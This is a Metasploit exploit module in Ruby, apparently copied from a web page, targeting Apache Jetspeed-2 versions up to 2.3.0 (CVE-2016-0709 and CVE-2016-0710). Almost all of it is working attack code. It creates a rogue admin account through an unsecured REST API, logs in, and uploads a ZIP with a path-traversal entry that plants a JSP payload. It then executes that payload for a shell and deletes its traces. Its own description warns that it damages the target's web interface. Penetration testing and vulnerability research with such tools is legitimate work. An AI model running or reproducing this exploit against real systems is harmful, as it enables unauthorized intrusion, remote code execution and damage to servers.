# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = ManualRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Jetspeed Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the unsecured User Manager REST API and a ZIP file
        path traversal in Apache Jetspeed-2, versions 2.3.0 and unknown earlier
        versions, to upload and execute a shell.
 
        Note: this exploit will create, use, and then delete a new admin user.
 
        Warning: in testing, exploiting the file upload clobbered the web
        interface beyond repair. No workaround has been found yet. Use this
        module at your own risk. No check will be implemented.
      },
      &#039;Author&#039;         => [
        &#039;Andreas Lindh&#039;, # Vulnerability discovery
        &#039;wvu&#039;            # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2016-0710&#039;],
        [&#039;CVE&#039;, &#039;2016-0709&#039;],
        [&#039;URL&#039;, &#039;http://haxx.ml/post/140552592371/remote-code-execution-in-apache-jetspeed-230-and&#039;],
        [&#039;URL&#039;, &#039;https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0709&#039;],
        [&#039;URL&#039;, &#039;https://portals.apache.org/jetspeed-2/security-reports.html#CVE-2016-0710&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Mar 6 2016&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;win&#039;],
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Apache Jetspeed <= 2.3.0 (Linux)&#039;,   &#039;Platform&#039; => &#039;linux&#039;],
        [&#039;Apache Jetspeed <= 2.3.0 (Windows)&#039;, &#039;Platform&#039; => &#039;win&#039;]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options([
      Opt::RPORT(8080)
    ])
  end
 
  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def print_warning(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end
 
  def exploit
    print_status("Creating admin user: #{username}:#{password}")
    create_admin_user
    # This was originally a typo... but we&#039;re having so much fun!
    print_status(&#039;Kenny Loggins in&#039;)
    kenny_loggins
    print_warning(&#039;You have entered the Danger Zone&#039;)
    print_status("Uploading payload ZIP: #{zip_filename}")
    upload_payload_zip
    print_status("Executing JSP shell: /jetspeed/#{jsp_filename}")
    exec_jsp_shell
  end
 
  def cleanup
    print_status("Deleting user: #{username}")
    delete_user
    super
  end
 
  #
  # Exploit methods
  #
 
  def create_admin_user
    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => &#039;/jetspeed/services/usermanager/users&#039;,
      &#039;vars_post&#039; => {
        &#039;name&#039;             => username,
        &#039;password&#039;         => password,
        &#039;password_confirm&#039; => password
      }
    )
    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "/jetspeed/services/usermanager/users/#{username}",
      &#039;vars_post&#039; => {
        &#039;user_enabled&#039; => &#039;true&#039;,
        &#039;roles&#039;        => &#039;admin&#039;
      }
    )
  end
 
  def kenny_loggins
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/jetspeed/login/redirector&#039;
    )
 
    res = send_request_cgi!(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => &#039;/jetspeed/login/j_security_check&#039;,
      &#039;cookie&#039;    => res.get_cookies,
      &#039;vars_post&#039; => {
        &#039;j_username&#039; => username,
        &#039;j_password&#039; => password
      }
    )
 
    @cookie = res.get_cookies
  end
 
  def import_file
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/jetspeed/portal/Administrative/site.psml&#039;,
      &#039;cookie&#039; => @cookie
    )
 
    html = res.get_html_document
    import_export = html.at(&#039;//a[*//text() = "Import/Export"]/@href&#039;)
 
    res = send_request_cgi!(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => import_export,
      &#039;cookie&#039; => @cookie
    )
 
    html = res.get_html_document
    html.at(&#039;//form[*//text() = "Import File"]/@action&#039;)
  end
 
  def upload_payload_zip
    zip = Rex::Zip::Archive.new
    zip.add_file("../../webapps/jetspeed/#{jsp_filename}", payload.encoded)
 
    mime = Rex::MIME::Message.new
    mime.add_part(zip.pack, &#039;application/zip&#039;, &#039;binary&#039;,
                  %Q{form-data; name="fileInput"; filename="#{zip_filename}"})
    mime.add_part(&#039;on&#039;, nil, nil, &#039;form-data; name="copyIdsOnImport"&#039;)
    mime.add_part(&#039;Import&#039;, nil, nil, &#039;form-data; name="uploadFile"&#039;)
 
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      register_files_for_cleanup("../webapps/jetspeed/#{jsp_filename}")
      register_files_for_cleanup("../temp/#{username}/#{zip_filename}")
    when &#039;win&#039;
      register_files_for_cleanup("..\\webapps\\jetspeed\\#{jsp_filename}")
      register_files_for_cleanup("..\\temp\\#{username}\\#{zip_filename}")
    end
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => import_file,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;cookie&#039; => @cookie,
      &#039;data&#039;   => mime.to_s
    )
  end
 
  def exec_jsp_shell
    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/jetspeed/#{jsp_filename}",
      &#039;cookie&#039; => @cookie
    )
  end
 
  #
  # Cleanup methods
  #
 
  def delete_user
    send_request_cgi(
      &#039;method&#039; => &#039;DELETE&#039;,
      &#039;uri&#039;    => "/jetspeed/services/usermanager/users/#{username}"
    )
  end
 
  # XXX: This is a hack because FileDropper doesn&#039;t delete directories
  def on_new_session(session)
    super
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      print_status("Deleting user temp directory: ../temp/#{username}")
      session.shell_command_token("rm -rf ../temp/#{username}")
    when &#039;win&#039;
      print_status("Deleting user temp directory: ..\\temp\\#{username}")
      session.shell_command_token("rd /s /q ..\\temp\\#{username}")
    end
  end
 
  #
  # Utility methods
  #
 
  def username
    @username ||= Rex::Text.rand_text_alpha_lower(8)
  end
 
  def password
    @password ||= Rex::Text.rand_text_alphanumeric(8)
  end
 
  def jsp_filename
    @jsp_filename ||= Rex::Text.rand_text_alpha(8) + &#039;.jsp&#039;
  end
 
  def zip_filename
    @zip_filename ||= Rex::Text.rand_text_alpha(8) + &#039;.zip&#039;
  end
 
end

